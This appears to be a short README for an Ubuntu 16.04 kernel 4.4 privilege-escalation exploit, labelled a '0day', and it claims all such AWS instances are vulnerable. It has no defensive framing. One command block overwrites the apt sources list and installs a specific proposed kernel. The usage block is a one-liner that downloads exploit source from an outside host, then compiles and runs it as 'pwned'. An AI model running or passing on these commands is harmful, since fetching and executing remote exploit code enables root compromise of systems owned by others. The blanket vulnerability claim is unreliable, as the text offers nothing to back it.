# Ubuntu16.04-0day

#### all 4.4 ubuntu aws instances are vulnerable

```

echo "deb http://archive.ubuntu.com/ubuntu/  xenial-proposed restricted main multiverse universe" > /etc/apt/sources.list

apt update 

apt install linux-image-4.4.0-117-generic

reboot

```

[![asciicast](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW.png)](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW)


## Use-Age:

```

wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 


```

![](./0day.jpg)
